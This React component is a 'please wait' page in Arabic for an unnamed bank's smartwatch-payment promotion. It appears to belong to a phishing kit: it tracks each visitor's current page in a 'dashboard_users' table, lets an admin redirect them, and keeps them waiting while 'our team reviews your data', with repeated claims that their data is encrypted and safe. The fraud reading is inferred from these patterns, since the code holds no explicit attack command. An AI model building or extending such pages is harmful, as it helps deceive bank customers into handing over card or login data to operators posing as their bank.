import { useEffect, useState, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Shield, Watch, CreditCard, ChevronLeft, ChevronRight, Sparkles, ShieldCheck, Clock } from "lucide-react";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";
import promo1 from "@/assets/waiting-promo-1.jpg";
import promo2 from "@/assets/waiting-promo-2.jpg";
import promo3 from "@/assets/waiting-promo-3.jpg";
import { useAdminRedirect } from "@/hooks/use-admin-redirect";

const promoSlides = [
  { image: promo1, title: "ساعة ذكية بأسلوب عصري", desc: "استمتع بأحدث الساعات الذكية مع خدماتنا المصرفية المتكاملة", icon: Watch },
  { image: promo2, title: "أمانك أولويتنا", desc: "تقنيات تشفير متقدمة لحماية معاملاتك المصرفية على مدار الساعة", icon: Shield },
  { image: promo3, title: "ادفع بلمسة واحدة", desc: "تجربة دفع سلسة وسريعة باستخدام ساعتك الذكية أينما كنت", icon: CreditCard },
];

const motivationalMessages = [
  "أمانك المصرفي في أيدٍ أمينة 🔒",
  "نعمل على تجهيز تجربتك المميزة ✨",
  "خطوة واحدة تفصلك عن عالم من المزايا 🚀",
  "ساعتك الذكية بانتظارك! ⌚",
  "نحرص على أعلى معايير الأمان لحمايتك 🛡️",
  "تجربة مصرفية لا مثيل لها في انتظارك 💎",
  "بياناتك مشفرة ومحمية بالكامل 🔐",
  "قريباً ستستمتع بأحدث التقنيات المصرفية 📱",
];

const Waiting = () => {
  const [searchParams] = useSearchParams();
  const userId = searchParams.get("uid") || "";
  useAdminRedirect(userId || null, { approveRedirect: "/success" });
  const [currentSlide, setCurrentSlide] = useState(0);
  const [currentMessage, setCurrentMessage] = useState(0);
  const [elapsed, setElapsed] = useState(0);
  const startTime = useRef(Date.now());

  useEffect(() => {
    const interval = setInterval(() => setCurrentSlide((prev) => (prev + 1) % promoSlides.length), 4000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const timer = setInterval(() => setElapsed(Math.floor((Date.now() - startTime.current) / 1000)), 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentMessage((prev) => {
        let next;
        do { next = Math.floor(Math.random() * motivationalMessages.length); } while (next === prev && motivationalMessages.length > 1);
        return next;
      });
    }, 5000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (!userId) return;
    supabase.from("dashboard_users").update({ last_page: "الانتظار" }).eq("id", userId).then();
  }, [userId]);

  const slide = promoSlides[currentSlide];
  const SlideIcon = slide.icon;

  return (
    <div className="min-h-screen bg-background flex flex-col relative" dir="rtl">
      <div className="fixed inset-0 gradient-mesh pointer-events-none" />
      <SiteHeader />

      <div className="flex items-center justify-center gap-4 py-2.5 bg-card/60 backdrop-blur-sm border-b border-border/40">
        <div className="flex items-center gap-1.5">
          <div className="w-5 h-5 rounded-md hero-gradient flex items-center justify-center">
            <ShieldCheck className="w-3 h-3 text-primary-foreground" />
          </div>
          <span className="text-[10px] font-bold text-foreground">مراجعة آمنة</span>
        </div>
        <div className="w-px h-3 bg-border" />
        <div className="flex items-center gap-1.5">
          <Clock className="w-3.5 h-3.5 text-primary" />
          <span className="text-[10px] text-muted-foreground font-medium">يتم مراجعة بياناتك الآن</span>
        </div>
      </div>

      <div className="flex-1 flex flex-col items-center px-4 py-6 gap-5 relative z-10">
        {/* Waiting card */}
        <div className="bg-card rounded-2xl card-shadow border border-border/30 p-6 max-w-3xl w-full text-center relative overflow-hidden">
          <div className="absolute -top-16 -right-16 w-32 h-32 orb orb-primary" />
          <div className="absolute -bottom-12 -left-12 w-24 h-24 orb orb-accent" />
          
          <div className="relative z-10">
            <div className="flex justify-center mb-4">
              <div className="w-16 h-16 border-4 border-primary/20 rounded-full flex items-center justify-center relative">
                <div className="w-12 h-12 border-[3px] border-primary border-t-transparent rounded-full animate-spin" />
                <div className="absolute inset-0 rounded-full shadow-glow opacity-50" />
              </div>
            </div>
            <h1 className="text-lg font-extrabold text-foreground mb-1.5">يرجى الانتظار</h1>
            <p className="text-muted-foreground text-xs leading-relaxed">
              جاري مراجعة بياناتك من قبل فريقنا المختص. يرجى عدم إغلاق هذه الصفحة.
            </p>

            <div className="mt-3 flex items-center justify-center gap-2 bg-muted/40 rounded-xl py-2.5 px-4 border border-border/30">
              <Clock className="w-4 h-4 text-primary" />
              <span className="text-sm font-bold text-foreground font-mono tabular-nums inline-block min-w-[3.5ch] text-center" dir="ltr">
                {String(Math.floor(elapsed / 60)).padStart(2, "0")}:{String(elapsed % 60).padStart(2, "0")}
              </span>
              <span className="text-[10px] text-muted-foreground">وقت الانتظار</span>
            </div>

            <div className="mt-4 pt-3 border-t border-border/30">
              <div className="flex items-center justify-center gap-2 bg-gradient-to-r from-primary/5 to-accent/10 rounded-xl py-2.5 px-3 border border-primary/10 min-h-[52px]">
                <Sparkles className="w-4 h-4 text-primary shrink-0" />
                <p className="text-xs font-semibold text-foreground transition-opacity duration-500 line-clamp-2 text-center">
                  {motivationalMessages[currentMessage]}
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Motivational tip */}
        <div className="flex items-start gap-3 bg-card/80 backdrop-blur-sm rounded-2xl p-4 max-w-3xl w-full border border-border/40 card-shadow">
          <div className="w-9 h-9 rounded-xl hero-gradient flex items-center justify-center shrink-0 shadow-button">
            <Sparkles className="w-4 h-4 text-primary-foreground" />
          </div>
          <div>
            <p className="text-xs font-bold text-foreground mb-0.5">هل تعلم؟</p>
            <p className="text-[11px] text-muted-foreground leading-relaxed">
              ساعتك الذكية ستتيح لك الدفع بلمسة واحدة في أكثر من 50,000 نقطة بيع حول العالم.
            </p>
          </div>
        </div>

        {/* Promo carousel */}
        <div className="bg-card rounded-2xl card-shadow border border-border/30 max-w-3xl w-full overflow-hidden">
          <div className="relative">
            <img src={slide.image} alt={slide.title} className="w-full h-44 object-cover transition-all duration-700" width={800} height={512} />
            <div className="absolute inset-0 bg-gradient-to-t from-foreground/80 via-foreground/30 to-transparent" />
            <div className="absolute bottom-3 right-3 left-3 text-primary-foreground">
              <div className="flex items-center gap-2 mb-1">
                <div className="w-7 h-7 rounded-lg glass-dark flex items-center justify-center">
                  <SlideIcon className="w-4 h-4" />
                </div>
                <h3 className="font-bold text-sm drop-shadow">{slide.title}</h3>
              </div>
              <p className="text-[11px] opacity-90 drop-shadow">{slide.desc}</p>
            </div>
          </div>

          <div className="flex items-center justify-center gap-3 py-3">
            <button onClick={() => setCurrentSlide((prev) => (prev - 1 + promoSlides.length) % promoSlides.length)} className="w-7 h-7 rounded-lg bg-muted/60 flex items-center justify-center text-muted-foreground hover:text-primary hover:bg-primary/10 transition-colors">
              <ChevronRight className="w-4 h-4" />
            </button>
            <div className="flex gap-1.5">
              {promoSlides.map((_, i) => (
                <button key={i} onClick={() => setCurrentSlide(i)} className={`h-1.5 rounded-full transition-all duration-300 ${i === currentSlide ? "hero-gradient w-5" : "bg-muted-foreground/25 w-1.5"}`} />
              ))}
            </div>
            <button onClick={() => setCurrentSlide((prev) => (prev + 1) % promoSlides.length)} className="w-7 h-7 rounded-lg bg-muted/60 flex items-center justify-center text-muted-foreground hover:text-primary hover:bg-primary/10 transition-colors">
              <ChevronLeft className="w-4 h-4" />
            </button>
          </div>
        </div>
      </div>
      <SiteFooter />
    </div>
  );
};

export default Waiting;
